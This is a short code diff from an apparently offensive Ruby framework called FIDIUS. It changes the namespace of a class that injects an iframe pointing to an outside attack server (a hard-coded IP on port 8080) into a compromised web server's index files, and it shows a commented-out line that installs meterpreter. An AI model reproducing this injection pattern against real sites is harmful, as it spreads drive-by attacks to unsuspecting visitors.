@@ -68,7 +68,7 @@ module FIDIUS
         add_route_to_session session
         #TODO Reco
         #FIXME: get the local address of the interface the webautopwn is running on.
-        webserver_iframe = FIDIUS::WebserverIFrameInjection.new session, "http://134.102.16.120:8080/"
+        webserver_iframe = FIDIUS::Session::WebserverIFrameInjection.new session, "http://134.102.16.120:8080/"
         webserver_iframe.localizeIndexFiles
 #        install_meterpreter session
       rescue ::Exception
